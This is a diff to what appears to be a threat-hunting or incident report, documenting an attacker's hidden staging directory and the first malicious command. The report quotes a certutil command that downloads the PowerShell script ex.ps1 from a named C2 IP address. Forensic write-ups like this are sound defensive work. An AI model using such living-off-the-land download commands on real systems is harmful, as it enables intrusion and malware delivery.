@@ -103,13 +103,11 @@ Network configuration enumeration actions were performed in order to scope the e
 
 <img width="1558" height="397" alt="image" src="https://github.com/user-attachments/assets/32e20007-5f59-46d0-b5ce-c22fd74fa1a0" />
 
+Modifications to file system attributes were done with the intent to hide the staging directory from users and security tools. The staging path `C:\Windows\Logs\CBS` was created and modified to organize tools and stolen data before exiltration. This directory path is directly linked to the IoC (Indicators of Compromise).
 
+<img width="1877" height="538" alt="image" src="https://github.com/user-attachments/assets/c788caaf-38fd-4a27-8e2e-6eda6d9ddf54" />
 
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-The earliest signs of malicious command execution point to the unauthorized download of a suspicious script by using legitimate system utilities with network access.
-
-<img width="1312" height="362" alt="image" src="https://github.com/user-attachments/assets/bdfc9daa-9aa9-45d9-a224-d1e78b632100" />
+The earliest signs of malicious command execution point to the unauthorized download of a suspicious script by using legitimate system utilities with network access.<br>
 
 The PowerShell script `ex.ps1` was downloaded at using the command `"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1` which also established the first contact of the C2 server `78.141.196.6`.<br>
 
